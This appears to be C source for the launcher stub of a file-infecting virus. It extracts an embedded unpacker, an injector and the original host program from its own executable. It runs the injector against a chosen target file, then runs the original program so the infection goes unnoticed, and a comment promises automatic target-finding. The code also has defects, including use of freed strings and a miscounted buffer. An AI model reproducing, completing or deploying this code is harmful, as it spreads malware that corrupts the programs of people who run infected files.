#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>


#include "utils.c"


#ifdef _WIN32
    #define _CRT_NONSTDC_NO_WARNINGS
#endif


#ifdef _WIN32
    #define UNPACKER_EXE_SIZE 392970
    #define INJECTOR_EXE_SIZE 391420
#else
    #define UNPACKER_EXE_SIZE 13856
    #define INJECTOR_EXE_SIZE 13584
#endif


bool unpack(const char *full_bin_path, char **unpacker, char **injector, char **original) {

    FILE *full_bin = fopen(full_bin_path, "rb");
    if (full_bin == NULL)
        return false;

    // fuck race conditions tbh, i need this to work; i need a name
    // and not just a pointer to a handle or whatever.
    *unpacker = tempnam(NULL, "lolwr");
    if (*unpacker == NULL)
        return false;

    if (!read_fp_into_path(full_bin, *unpacker, UNPACKER_EXE_SIZE))
        return false;

    // fuck race conditions tbh, i need this to work; i need a name
    // and not just a pointer to a handle or whatever.
    *injector = tempnam(NULL, "lolwr");
    if (*injector == NULL)
        return false;

    if (!read_fp_into_path(full_bin, *injector, INJECTOR_EXE_SIZE))
        return false;
    
    // fuck race conditions tbh, i need this to work; i need a name
    // and not just a pointer to a handle or whatever.
    *original = tempnam(NULL, "lolwr");
    if (*original == NULL)
        return false;

    if (!read_fp_into_path(full_bin, *original, -1))
        return false;

    if (fclose(full_bin) == EOF)
        return false;
    
    return true;
}


int main(int argc, char *argv[]) {

    if (argc < 2) {
        // targetfinding will be automatic soon!
        fprintf(stderr, "for now i need a TARGET to be specified");
        return 1;
    }

    char *target = argv[1];

    char *unpacker;
    char *injector;
    char *original;

    if (!unpack(argv[0], &unpacker, &injector, &original)) {
        perror(strerror(errno));
        return 1;
    }

    // 5 bc ".exe\0"
    char *injector_bin = malloc(strlen(injector) + 5);
    strcpy(injector_bin, injector);
    strcat(injector_bin, ".exe");
    
    free(injector);
    
    if (rename(injector, injector_bin)) {
        perror(strerror(errno));
        return 1;
    }
    
    // 11 bc 2 spaces, 8 double quotes and a null terminator.
    size_t injector_cmd_size = strlen(injector_bin) + strlen(unpacker) + strlen(target) + 11;
    char *injector_cmd = malloc(injector_cmd_size);
    if (injector_cmd == NULL) {
        perror(strerror(errno));
        return 1;
    }

    if (sprintf(injector_cmd, "\"\"%s\" \"%s\" \"%s\"\"", injector_bin, unpacker, target) < 0) {
        perror(strerror(errno));
        return 1;
    }
    
    system(injector_cmd);

    if (remove(injector_bin)) {
        perror(strerror(errno));
        return 1;
    }

    free(injector_bin);
    free(injector_cmd);

    // 5 bc ".exe\0"
    char *original_bin = malloc(strlen(original) + 5);
    strcpy(original_bin, original);
    strcat(original_bin, ".exe");
    
    free(original);
    
    if (rename(original, original_bin)) {
        perror(strerror(errno));
        return 1;
    }
    
    // 5 bc 4 double quotes and a null terminator.
    size_t original_cmd_size = strlen(original_bin) + 5;
    char *original_cmd = malloc(original_cmd_size);
    if (original_cmd == NULL) {
        perror(strerror(errno));
        return 1;
    }

    if (sprintf(original_cmd, "\"\"%s\"\"", original_bin) < 0) {
        perror(strerror(errno));
        return 1;
    }

    system(original_cmd);

    if (remove(original_bin)) {
        perror(strerror(errno));
        return 1;
    }

    free(original_bin);
    free(original_cmd);

    return 0;
}

